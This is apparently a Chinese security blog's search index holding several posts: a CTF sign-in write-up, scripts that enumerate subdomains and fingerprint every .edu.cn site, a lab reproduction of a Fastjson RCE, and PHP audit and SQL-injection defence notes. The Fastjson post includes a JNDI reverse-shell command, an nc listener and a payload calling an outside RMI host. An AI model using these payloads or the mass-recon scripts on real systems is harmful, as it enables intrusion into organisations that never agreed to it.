<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>realworldctf_解题过程记录</title>
      <link href="2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/"/>
      <url>2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这篇文章题目说是解题记录，还不如说是划水记录，哈哈哈哈哈。由于是第一次参加ctf比赛，没什么经验，所以只做出来了一道送分的签到题，但是还是有很多收获的。</p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h4 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h4><p>第一题叫做chat-in，这道题其实就是根据给出的一段哈希值去计算一个值，就和比特币挖矿类似，算是一个pow证明。</p><p>![capture_20230107161442033](D:\Huawei Share\Screenshot\capture_20230107161442033.bmp)</p><p>这里出题方温馨的给出了一个github脚本链接，这个脚本就是用来计算答案的。不过比较坑的地方是，如果你像我一样用的是<code>python 3.7.9</code>,那么恭喜你运行脚本之后就会报错，原因是没有加上<code>if __name__ ==&quot;__main__&quot;</code>，加上之后就可以正常运行脚本了，最后将计算出来的值填入就可以进入目标主机拿到flag了。</p><p>![capture_20230107160246982](D:\Huawei Share\Screenshot\capture_20230107160246982.bmp)</p><p>![capture_20230107160253993](D:\Huawei Share\Screenshot\capture_20230107160253993.bmp)</p><p>![capture_20230107160236881](D:\Huawei Share\Screenshot\capture_20230107160236881.bmp)</p><p>![capture_20230107160017956](D:\Huawei Share\Screenshot\capture_20230107160017956.bmp)</p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/Users\Oringals\AppData\Roaming\Typora\typora-user-images\image-20230108162012048.png" alt="image-20230108162012048"></p><p>我顺利拿到送分题的35积分，也是没想到，拿下送分题其实就已经超越很多人了。之后我还看了一下排行榜，一眼看上了以个叫<code>bule water</code>的大神（排名第一当时）也是一个人在战斗，看了一下他的解题记录，我觉得有一天我也可以变得像他一样那么的强（手动狗头），我不是在开玩笑，哈哈哈哈！</p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/Users\Oringals\AppData\Roaming\Typora\typora-user-images\image-20230108162209745.png" alt="image-20230108162209745"></p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/Users\Oringals\AppData\Roaming\Typora\typora-user-images\image-20230108162714403.png" alt="image-20230108162714403"></p><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p>接下来就是痛苦之旅了，第二道web题考的是xss，</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web打点_全网edu网站指纹识别_脚本全自动化</title>
      <link href="2023/01/07/web%E6%89%93%E7%82%B9_%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB_%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
      <url>2023/01/07/web%E6%89%93%E7%82%B9_%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB_%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-思路"><a href="#0x00-思路" class="headerlink" title="0x00 思路"></a>0x00 思路</h3><ol><li><p>先通过fofa搜索全网的edu网站，导出到本地，将结果复制到urls.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fofa: host&#x3D;&quot;.edu.cn&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/01/07/web%E6%89%93%E7%82%B9_%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB_%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230107062110192.png" alt="image-20230107062110192"></p></li></ol><ol start="2"><li><p>编写python脚本，对urls.txt文件中重复主站点的url进行删除，然后再自动化调用subfinder进行子域名搜集，把子域名搜索结果分别保存到以主站点为名的csv文件中。之后，再写一个调用Finger(python编写的一款指纹识别工具)的脚本，对每个主站点的子域名进行指纹识别。</p><p><img src="/2023/01/07/web%E6%89%93%E7%82%B9_%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB_%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230107064006952.png" alt="image-20230107064006952"></p></li></ol><h3 id="0x01-具体实现"><a href="#0x01-具体实现" class="headerlink" title="0x01 具体实现"></a>0x01 具体实现</h3><p>这里直接给出我写的两个脚本，一个是调用subfinder实现自动化，另一个是调用finger实现自动化</p><p><code>auto_serach_domain.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">去掉重复的域名</span><br><span class="line">调用subfinder查找子域名</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">def get_main_domain(url):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    对子域名进行处理，返回主域名</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    url &#x3D; url.split(&quot;.&quot;)</span><br><span class="line">    url[-1] &#x3D; url[-1].replace(&#39;\n&#39;, &#39;&#39;)</span><br><span class="line">    url &#x3D; url[-3]+&#39;.&#39;+url[-2]+&#39;.&#39;+url[-1]</span><br><span class="line">    if &quot;&#x2F;&#x2F;&quot; in url:</span><br><span class="line">        url &#x3D; url.replace(&#39;http:&#x2F;&#x2F;&#39;,&#39;&#39;).replace(&#39;https:&#x2F;&#x2F;&#39;,&#39;&#39;)</span><br><span class="line">    if &quot;:&quot; in url:</span><br><span class="line">        url &#x3D; url.split(&#39;:&#39;)[0]</span><br><span class="line">    return url</span><br><span class="line"></span><br><span class="line">def move_again_domain(url_list):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    对域名进行去重处理</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    return list(set(url_list))</span><br><span class="line"></span><br><span class="line">def run(url):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    调用subfinder查找子域名</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    save_file &#x3D; url + &#39;.csv&#39;</span><br><span class="line">    command &#x3D; f&#39;subfinder.exe -d &#123;url&#125; -all -nW -oI -o &#123;save_file&#125;&#39;</span><br><span class="line">    print(f&quot;[+] current run command: &#123;command&#125;&quot;)</span><br><span class="line">    print(f&#39;[+] current search url: &#123;url&#125;&#39;)</span><br><span class="line">    os.system(command)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    u &#x3D; []</span><br><span class="line">    with open(&#39;urls.txt&#39;,&#39;r&#39;) as f:</span><br><span class="line">        urls &#x3D; f.readlines()</span><br><span class="line">        for url in urls:</span><br><span class="line">            url &#x3D; get_main_domain(url)</span><br><span class="line">            u.append(url)</span><br><span class="line">    u &#x3D; move_again_domain(u)</span><br><span class="line">    for url in u:</span><br><span class="line">        run(url)</span><br><span class="line">    # with open(&#39;u.txt&#39;,&#39;w&#39;) as f:</span><br><span class="line">    #     for url in u:</span><br><span class="line">    #         f.write(url + &#39;\n&#39;)</span><br><span class="line">    print(&quot;[+] Done!!!&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>auto_run_finger.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import csv</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import re </span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">从csv文件中取出url，自动识别资产</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">def get_csv_data(csv_file):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    从csv文件中获取第一列的数据</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    u &#x3D; []</span><br><span class="line">    with open(csv_file,&#39;r&#39;) as f:</span><br><span class="line">        o &#x3D; csv.reader(f)</span><br><span class="line">        for data in o:</span><br><span class="line">            u.append(data[0])</span><br><span class="line">    return u</span><br><span class="line"></span><br><span class="line">def run(command&#x3D;&#39;&#39;):</span><br><span class="line">    print(f&quot;[+] Current run command:&#123;command&#125;&quot;)</span><br><span class="line">    os.system(command)</span><br><span class="line"></span><br><span class="line">def write_file(u,filename&#x3D;&#39;urls.txt&#39;):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    将列表中的url保存到txt中,并以对应的域名进行命名</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    with open(filename,&#39;w&#39;) as f:</span><br><span class="line">        for url in u:</span><br><span class="line">            f.write(url+&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">def get_dir_csv(path):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    获取path目录下所有的csv文件, 并返回一个列表</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    csv_list &#x3D; []</span><br><span class="line">    for root, dirs, files in os.walk(path):</span><br><span class="line">        for f in files:</span><br><span class="line">            if &#39;csv&#39; in f:</span><br><span class="line">                csv_list.append(f)</span><br><span class="line">    return root,csv_list</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    csv_file_path&#x3D; sys.argv[1] # 保存域名的csv文件目录</span><br><span class="line">    root,csv_dir_list &#x3D; get_dir_csv(path&#x3D;csv_file_path)</span><br><span class="line">    </span><br><span class="line">    for csv_filename in csv_dir_list:</span><br><span class="line">        csv_filename &#x3D; root + &#39;\\&#39; + csv_filename</span><br><span class="line">        u &#x3D; get_csv_data(csv_filename)</span><br><span class="line">        file_name &#x3D; re.search(r&#39;[a-z]&#123;1,10&#125;.edu.cn.csv&#39;, csv_filename).group().replace(&#39;.csv&#39;, &#39;&#39;) + &#39;.txt&#39;</span><br><span class="line">        print(f&#39;[+] save file name &#123;file_name&#125;&#39;)</span><br><span class="line">        write_file(u,file_name)</span><br><span class="line">        run(command&#x3D;f&#39;python .\Finger.py -f &#123;file_name&#125;&#39;)</span><br><span class="line"></span><br><span class="line">def banner():</span><br><span class="line">    print(&quot;Usage:python auto_run_finger.py [file]&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    try:</span><br><span class="line">        main()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        banner()</span><br></pre></td></tr></table></figure><p><img src="/2023/01/07/web%E6%89%93%E7%82%B9_%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB_%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230107064154752.png" alt="image-20230107064154752"></p><p>​       <img src="/2023/01/07/web%E6%89%93%E7%82%B9_%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB_%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230107063935418.png" alt="image-20230107063935418"></p><h3 id="0x02-最后想说的"><a href="#0x02-最后想说的" class="headerlink" title="0x02 最后想说的"></a>0x02 最后想说的</h3><p>这些是我在凌晨看HVV有关 web打点的文章时，突然冒出来的想法，其实以前也有过自动化的想法，奈何一直没有合适机会，这次总算是开始了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson远程代码执行CNVD-2019-22238</title>
      <link href="2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/"/>
      <url>2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>以前都没怎么写技术有关的文章，可能是觉得自己写的会不好，误导别人。现在，自认为有点实力了，就写些漏洞复现的文章压压筋，另外一个原因就是，在复现找文章总是会出现各种问题，所以，我觉得还是自己写文章，做记录，这样以后又遇到类似的问题就可以看自己写的文章解决了。</p><h3 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01 漏洞简述"></a>0x01 漏洞简述</h3><p> Fastjson 是一个 Java 库,可以将 Java 对象转换为 JSON 格式,当然它也可以将 JSON 字符串转换为 Java 对象 Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。 </p><h3 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h3><p>我用的是vulfoucs靶场复现的，fastjson&lt;=1.2.24，由于fastjson版本不同payload也会有所不同，所以这里提前声明一下。</p><p><img src="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/image-20230106232719456.png" alt="image-20230106232719456"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主要步骤 </span><br><span class="line">1.通过dnslog检测漏洞是否存在</span><br><span class="line">2.在公网vps上通过JNDI-Injection-Exploit工具搭建ladp和rmi服务</span><br><span class="line">3.通过rmi协议加载恶意类，利用bash反弹shell</span><br></pre></td></tr></table></figure><p>工具下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;welk1n&#x2F;JNDI-Injection-Exploit.git</span><br></pre></td></tr></table></figure><p>1.通过dns记录简单检测是否存在漏洞，我这里用的是<code>dnslog.cn</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.10.136:30205</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko&#x2F;20100101 Firefox&#x2F;108.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: _ga&#x3D;GA1.1.1724489366.1672828241; vue_admin_template_token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjczMDc2Njk2LCJlbWFpbCI6IiJ9.aNjhBv5CArS5vVUviD9ySBcH0zcP9j1hn79L29j3u-Q</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 70</span><br><span class="line"></span><br><span class="line">&#123;&quot;zeo&quot;:</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;13uw56.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>注意: 双引号和逗号都是英文的，复制之后注意检查，还有注意<code>Content-Type: application/json</code>,提交方式为<code>POST</code></p><p>返回包没有报错就是一般就是利用成功了</p><p><img src="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/image-20230106231837457.png" alt="image-20230106231837457"></p><p><img src="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/image-20230106230659916.png" alt="image-20230106230659916"></p><p>2.在vps上通过JNDI-Injection-Exploit工具搭建ldap&amp;rmi服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,base64加密的bash反弹shell payload&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;vps的ip地址&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/image-20230106231218516.png" alt="image-20230106231218516"></p><p>这里的bash 反弹shell可以去<code>https://www.revshells.com/</code>这个网站生成，然后进行base64编码即可。</p><p>3.通过rmi协议请求恶意类，从而执行bash反弹shell的代码，同时在vps上同时监听对应的端口```nc -lvvp [port]``，这里设置的监听端口是利用bash反弹shell的端口</p><p>不同版本payload有所不同，这里的版本<code>fastjson&lt;=1.2.24</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.10.136:32132</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko&#x2F;20100101 Firefox&#x2F;108.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: _ga&#x3D;GA1.1.1724489366.1672828241; vue_admin_template_token&#x3D;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjczMDc2Njk2LCJlbWFpbCI6IiJ9.aNjhBv5CArS5vVUviD9ySBcH0zcP9j1hn79L29j3u-Q</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 160</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;123.249.90.73:1099&#x2F;fanobj&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功反弹shell获取到flag</p><p><img src="/2023/01/07/Fastjson%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCNVD-2019-22238/image-20230107000209003.png" alt="image-20230107000209003"></p><p>打完，收工，早上10点打ctf比赛，嘿嘿！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php代码审计_mvc框架审计_文件上传笔记</title>
      <link href="2023/01/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_php_mvc%E6%A1%86%E6%9E%B6_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>2023/01/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1_php_mvc%E6%A1%86%E6%9E%B6_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>2023年啦！最近在学代码审计。如果按照搭建博客的2021年1月算，我已经学了2年的网安啦！但是，我现在才感觉真正入门，如今的我，poc&amp;exp也会写了（能自己独立写，也能写到pocsuite3框架里面去），开始有分析漏洞的能力了（以前只会利用漏洞，不懂为什么payload要那样去打），现在能从代码层面一步一步追踪分析漏洞的成因，我有种打开新世界大门的感觉，我更加有信心了。虽然还有好多收获想说，但是又欲言又止，总之，还有很多东西等着我去探索学习。</p><p>最近这几天写的一些poc列举</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">20230104_7_thinkphp_lang_rce.py thinkphp lang远程命令执行</span><br><span class="line">20230103_6_sendproduct100_sqli.py 发货100 M_id SQL注入CNVD-2021-30193</span><br><span class="line">f5_big-ip_rce_cve-2021-22986.py BIG-IP远程代码执行漏洞(CVE-2021-22986)</span><br></pre></td></tr></table></figure><h4 id="一些计划"><a href="#一些计划" class="headerlink" title="一些计划"></a>一些计划</h4><p>1月7日打算参加长亭科技举办的real world CTF体验赛，由于以前没有经验，所以我打算step by step，当作一次不错的学习机会来对待这个比赛。</p><p>新的一年，我打算把php&amp;java代码审计(漏洞分析能力 漏洞挖掘能力)和内网渗透(复杂网络下的横向渗透能力)学好，有机会还可以学习一下云服务器下的渗透思路（assesskey泄露，CF框架的使用），至少达到中级红队的要求，准备23年6-7月份的护网以及秋招。</p><p>其实除了传统的web安全，我对近源渗透（badUSB，wifi，门禁卡ID&amp;IC卡）以及apt攻击中常用的水坑攻击和鱼叉攻击都非常感兴趣，也都有所了解。</p><h3 id="文件上传审计关键点"><a href="#文件上传审计关键点" class="headerlink" title="文件上传审计关键点"></a>文件上传审计关键点</h3><ul><li>全局寻找关键字 $FILES 以及可能出现在代码中的文字(如，’文件上传成功’)，定位上传功能的代码段</li><li>功能点抓包,再根据参数或路由信息找到对应源代码</li><li>理清上传的判断逻辑（黑名单，白名单，前端js，MIME类型）</li></ul><h3 id="thinkphp框架下审计的关键点"><a href="#thinkphp框架下审计的关键点" class="headerlink" title="thinkphp框架下审计的关键点"></a>thinkphp框架下审计的关键点</h3><ul><li><p>找到入口文件，思考网站的路由信息是如何生成的，网站目录结构</p></li><li><p>找到控制器文件，一般在application目录下，再结合一些功能点抓包得到的参数，理清代码结构逻辑，如在发送的poc中哪个参数对应类，哪个参数对应方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find .&#x2F; -name &quot;*.php&quot;|xargs grep &quot;你要搜索的文件中的文本内容&quot; 一条有用查找文件内容的命令</span><br></pre></td></tr></table></figure></li></ul><ul><li>看使用框架的代码是否规范，是否正确的使用了框架的一些安全检查方法，而不是使用自己写方法。</li></ul><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>理不清楚执行过程，可以通过phpstorm+xdebug设置断点一步一步看执行的情况。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>学习&amp;生活_php下通过预编译防御sql注入</title>
      <link href="2022/04/28/%E5%AD%A6%E4%B9%A0-%E7%94%9F%E6%B4%BB-php%E4%B8%8B%E9%80%9A%E8%BF%87%E9%A2%84%E7%BC%96%E8%AF%91%E9%98%B2%E5%BE%A1sql%E6%B3%A8%E5%85%A5/"/>
      <url>2022/04/28/%E5%AD%A6%E4%B9%A0-%E7%94%9F%E6%B4%BB-php%E4%B8%8B%E9%80%9A%E8%BF%87%E9%A2%84%E7%BC%96%E8%AF%91%E9%98%B2%E5%BE%A1sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h2><ul><li>通过预编译，先将查询语句发送给服务器，再发送用户提交的参数信息<h3 id="1-通过PDO防御"><a href="#1-通过PDO防御" class="headerlink" title="1.通过PDO防御"></a>1.通过PDO防御</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; set global general_log &#x3D; &#39;on&#39;  打开日志功能</span><br><span class="line">&#x2F;&#x2F; show 